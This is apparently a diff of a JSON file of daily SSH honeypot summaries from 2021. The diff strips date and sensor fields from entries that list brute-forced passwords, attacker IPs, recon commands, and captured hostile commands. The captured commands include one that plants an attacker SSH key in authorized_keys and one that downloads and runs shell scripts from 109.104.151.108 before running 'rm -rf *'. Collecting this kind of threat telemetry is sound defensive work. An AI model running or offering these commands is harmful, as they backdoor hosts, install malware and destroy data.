@@ -6,109 +6,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 18174,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 18174
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 735,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 735
     },
     {
       "username": "root",
       "password": "dietpi",
-      "count": 60,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 60
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 755,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 755
     },
     {
       "input": "lscpu | grep Model",
-      "count": 746,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 746
     },
     {
       "input": "uname",
-      "count": 746,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 746
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 659,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 659
     },
     {
       "input": "rm -rf /var/tmp/dota*",
-      "count": 86,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 86
     },
     {
       "input": "echo Hi | cat -n",
-      "count": 3,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 3
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.86.165",
       "dst_port": 2222,
-      "count": 1325,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1325
     },
     {
       "src_ip": "5.188.86.168",
       "dst_port": 2222,
-      "count": 1289,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1289
     },
     {
       "src_ip": "5.188.87.58",
       "dst_port": 2222,
-      "count": 1205,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1205
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.86.165",
       "robot": true,
-      "count": 933,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 933
     },
     {
       "src_ip": "5.188.86.168",
       "robot": true,
-      "count": 926,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 926
     },
     {
       "src_ip": "5.188.87.58",
       "robot": true,
-      "count": 885,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 885
     }
   ],
   "file_download": [
@@ -119,9 +89,7 @@
         "positives": 0,
         "total": 60
       },
-      "count": 1,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -130,9 +98,7 @@
         "positives": 0,
         "total": 57
       },
-      "count": 1,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -141,32 +107,24 @@
         "positives": 0,
         "total": 57
       },
-      "count": 1,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota.tar.gz",
       "src_ip": "118.89.237.20",
-      "count": 68,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 68
     },
     {
       "filename": "dota3.tar.gz",
       "src_ip": "121.241.244.92",
-      "count": 16,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 16
     },
     {
       "filename": "dota.tar.gz",
       "src_ip": "110.87.104.201",
-      "count": 1,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -174,25 +132,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "chekfast.zennolab.com",
       "dst_port": 80,
-      "count": 1681,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1681
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "184.150.200.206",
       "dst_port": 443,
-      "count": 1482,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1482
     },
     {
       "src_ip": "5.188.86.165",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 933,
-      "date": "2021-06-16",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 933
     }
   ]
 },
@@ -203,109 +155,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 18314,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 18314
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 107,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 107
     },
     {
       "username": "root",
       "password": "123123",
-      "count": 10,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 10
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 108,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 108
     },
     {
       "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-      "count": 107,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 107
     },
     {
       "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 107,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 107
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 98,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 98
     },
     {
       "input": "rm -rf /var/tmp/dota*",
-      "count": 5,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 5
     },
     {
       "input": "start;",
-      "count": 3,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 3
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.87.60",
       "dst_port": 2222,
-      "count": 1188,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1188
     },
     {
       "src_ip": "5.188.86.216",
       "dst_port": 2222,
-      "count": 1025,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1025
     },
     {
       "src_ip": "5.188.87.53",
       "dst_port": 2222,
-      "count": 1014,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1014
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.87.53",
       "robot": true,
-      "count": 1014,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1014
     },
     {
       "src_ip": "5.188.87.60",
       "robot": true,
-      "count": 870,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 870
     },
     {
       "src_ip": "5.188.87.58",
       "robot": true,
-      "count": 838,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 838
     }
   ],
   "file_download": [
@@ -316,9 +238,7 @@
         "positives": 0,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -327,9 +247,7 @@
         "positives": 0,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -338,32 +256,24 @@
         "positives": 0,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota.tar.gz",
       "src_ip": "45.80.64.246",
-      "count": 1,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "filename": "dota.tar.gz",
       "src_ip": "203.245.29.159",
-      "count": 1,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "filename": "dota.tar.gz",
       "src_ip": "180.76.53.208",
-      "count": 1,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -371,25 +281,19 @@
       "src_ip": "5.188.87.53",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 1014,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1014
     },
     {
       "src_ip": "5.188.87.60",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 872,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 872
     },
     {
       "src_ip": "5.188.87.58",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 838,
-      "date": "2021-05-03",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 838
     }
   ]
 },
@@ -400,109 +304,79 @@
     {
       "username": "root",
       "password": "admin",
-      "count": 19543,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 19543
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 826,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 826
     },
     {
       "username": "root",
       "password": "123",
-      "count": 282,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 282
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 852,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 852
     },
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 846,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 846
     },
     {
       "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 843,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 843
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 840,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 840
     },
     {
       "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://109.104.151.108/0x83911d24Fx.sh; curl -O http://109.104.151.108/0x83911d24Fx.sh; chmod 777 0x83911d24Fx.sh; sh 0x83911d24Fx.sh; tftp 109.104.151.108 -c get 0xt984767.sh; chmod 777 0xft6426467.sh; sh 0xft6426467.sh; tftp -r 0xtf2984767.sh -g 109.104.151.108; chmod 777 0xtf2984767.sh; sh 0xtf2984767.sh; ftpget -v -u anonymous -p anonymous -P 21 109.104.151.108 0xft6426467.sh 0xft6426467.sh; sh 0xft6426467.sh; rm -rf 0xt984767.sh 0xtf2984767.sh 0xft6426467.sh; rm -rf *",
-      "count": 19,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 19
     },
     {
       "input": "uname -s -v -n -r",
-      "count": 16,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 16
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.86.207",
       "dst_port": 2222,
-      "count": 1261,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1261
     },
     {
       "src_ip": "5.188.86.178",
       "dst_port": 2222,
-      "count": 1061,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1061
     },
     {
       "src_ip": "5.188.86.216",
       "dst_port": 2222,
-      "count": 1026,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1026
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.86.207",
       "robot": true,
-      "count": 867,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 867
     },
     {
       "src_ip": "5.188.87.57",
       "robot": true,
-      "count": 842,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 842
     },
     {
       "src_ip": "5.188.87.58",
       "robot": true,
-      "count": 833,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 833
     }
   ],
   "file_download": [
@@ -513,9 +387,7 @@
         "positives": 35,
         "total": 59
       },
-      "count": 2,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 2
     },
     {
       "url": "http://150.136.14.224/load.sh",
@@ -524,9 +396,7 @@
         "positives": null,
         "total": null
       },
-      "count": 1,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -534,25 +404,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "www.google.ru",
       "dst_port": 443,
-      "count": 5398,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 5398
     },
     {
       "src_ip": "5.182.39.62",
       "dst_ip": "i.instagram.com",
       "dst_port": 443,
-      "count": 2059,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 2059
     },
     {
       "src_ip": "5.182.39.61",
       "dst_ip": "i.instagram.com",
       "dst_port": 443,
-      "count": 1681,
-      "date": "2021-03-14",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1681
     }
   ]
 },
@@ -563,97 +427,71 @@
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 145,
-      "date": "2021-05-01",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 145
     },
     {
       "username": "admin",
       "password": "password",
-      "count": 5,
-      "date": "2021-05-01",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 5
     },
     {
       "username": "admin",
       "password": "admin",
-      "count": 5,
-      "date": "2021-05-01",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 5
     }
   ],
   "commands": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 145,
-      "date": "2021-05-01",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 145
     },
     {
       "input": "lscpu | grep Model",
-      "count": 145,
-      "date": "2021-05-01",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 145
     },
     {
       "input": "uname -a",
-      "count": 145,
-      "date": "2021-05-01",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 145
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 145,
-      "date": "2021-05-01",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 145
     }
   ],
   "connect": [
     {
       "src_ip": "134.122.89.249",
       "dst_port": 2222,
-      "count": 120,
-      "date": "2021-05-01",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 120
     },
     {
       "src_ip": "68.183.18.128",
       "dst_port": 2222,
-      "count": 118,
-      "date": "2021-05-01",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 118
     },
     {
       "src_ip": "165.22.1.151",
       "dst_port": 2222,
-      "count": 108,
-      "date": "2021-05-01",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 108
     }
   ],
   "session_closed": [
     {
       "src_ip": "134.122.89.249",
       "robot": true,
-      "count": 120,
-      "date": "2021-05-01",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 120
     },
     {
       "src_ip": "68.183.18.128",
       "robot": true,
-      "count": 110,
-      "date": "2021-05-01",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 110
     },
     {
       "src_ip": "165.22.1.151",
       "robot": true,
-      "count": 108,
-      "date": "2021-05-01",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 108
     }
   ],
   "proxy_request": [
@@ -661,9 +499,7 @@
       "src_ip": "45.146.165.151",
       "dst_ip": "google.com",
       "dst_port": 80,
-      "count": 1,
-      "date": "2021-05-01",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ]
 },
@@ -674,109 +510,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 18015,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 18015
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 142,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 142
     },
     {
       "username": "root",
       "password": "test",
-      "count": 110,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 110
     }
   ],
   "commands": [
     {
       "input": "echo -e \"\\x6F\\x6B\"",
-      "count": 261,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 261
     },
     {
       "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 144,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 144
     },
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 144,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 144
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "echo -e \"\\x6F\\x6B\"",
-      "count": 261,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 261
     },
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 140,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 140
     },
     {
       "input": "rm -rf /var/tmp/dota*",
-      "count": 2,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 2
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.87.60",
       "dst_port": 2222,
-      "count": 1284,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1284
     },
     {
       "src_ip": "5.188.86.168",
       "dst_port": 2222,
-      "count": 1044,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1044
     },
     {
       "src_ip": "5.188.86.165",
       "dst_port": 2222,
-      "count": 1020,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1020
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.87.60",
       "robot": true,
-      "count": 895,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 895
     },
     {
       "src_ip": "5.188.86.167",
       "robot": true,
-      "count": 856,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 856
     },
     {
       "src_ip": "5.188.86.168",
       "robot": true,
-      "count": 762,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 762
     }
   ],
   "file_download": [
@@ -787,9 +593,7 @@
         "positives": 0,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -798,25 +602,19 @@
         "positives": 0,
         "total": 59
       },
-      "count": 1,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota.tar.gz",
